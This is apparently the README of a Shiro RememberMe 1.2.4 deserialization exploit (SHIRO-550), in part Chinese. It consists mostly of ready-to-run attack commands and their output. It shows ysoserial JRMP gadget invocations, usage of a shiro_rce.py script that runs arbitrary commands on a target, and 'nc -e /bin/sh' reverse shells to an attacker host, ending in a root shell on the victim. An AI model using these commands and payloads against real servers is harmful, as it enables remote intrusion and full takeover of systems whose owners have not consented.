# Shiro RememberMe 1.2.4 反序列化漏洞（SHIRO-550）

![](./SHIRO-550.gif)

## commons-collections-3.2.1.jar

`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient "10.10.20.166:12345" |python exp.py`

`java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'nc -e /bin/sh 192.168.5.86 8989'`

`nc -nlvp 8989`

![](./commons-collections-3.2.1.jpg)

## python usage:

```
python3 shiro_rce.py


   _____ _    _ _____ _____   ____         _____ _____  ___
  / ____| |  | |_   _|  __ \ / __ \       | ____| ____|/ _ \
 | (___ | |__| | | | | |__) | |  | |______| |__ | |__ | | | |
  \___ \|  __  | | | |  _  /| |  | |______|___ \|___ \| | | |
  ____) | |  | |_| |_| | \ \| |__| |       ___) |___) | |_| |
 |_____/|_|  |_|_____|_|  \_\____/       |____/|____/ \___/

            Shiro RememberMe 1.2.4 反序列化漏洞




[+] Usage: python3 shiro_rce.py http://10.10.20.166:8080/shiro/ command

```

## touch file

```
python3 shiro_rce.py http://10.10.20.166:8080/samples-web-1.2.4/ "touch /tmp/123123123123"


   _____ _    _ _____ _____   ____         _____ _____  ___
  / ____| |  | |_   _|  __ \ / __ \       | ____| ____|/ _ \
 | (___ | |__| | | | | |__) | |  | |______| |__ | |__ | | | |
  \___ \|  __  | | | |  _  /| |  | |______|___ \|___ \| | | |
  ____) | |  | |_| |_| | \ \| |__| |       ___) |___) | |_| |
 |_____/|_|  |_|_____|_|  \_\____/       |____/|____/ \___/

            Shiro RememberMe 1.2.4 反序列化漏洞



2019-10-25 13:43:00

[+] Send POC Success
[+] Exit Shiro RCE Vuln
```

## Reverse shell

```
python3 shiro_rce.py http://10.10.20.166:8080/samples-web-1.2.4/ "nc -e /bin/sh 192.168.5.86 9999"


   _____ _    _ _____ _____   ____         _____ _____  ___
  / ____| |  | |_   _|  __ \ / __ \       | ____| ____|/ _ \
 | (___ | |__| | | | | |__) | |  | |______| |__ | |__ | | | |
  \___ \|  __  | | | |  _  /| |  | |______|___ \|___ \| | | |
  ____) | |  | |_| |_| | \ \| |__| |       ___) |___) | |_| |
 |_____/|_|  |_|_____|_|  \_\____/       |____/|____/ \___/

            Shiro RememberMe 1.2.4 反序列化漏洞



2019-10-25 13:43:33

[+] Send POC Success
[+] Exit Shiro RCE Vuln
```

```
C:\Users\CTF>nc -nlvp 9999
listening on [any] 9999 ...
connect to [192.168.5.86] from (UNKNOWN) [10.10.20.166] 38656
id
uid=0(root) gid=0(root) groups=0(root)
cd /tmp
ls
123123123123
```

## 参考链接：

http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html

https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html

https://blog.zsxsoft.com/post/35

https://paper.seebug.org/shiro-rememberme-1-2-4/
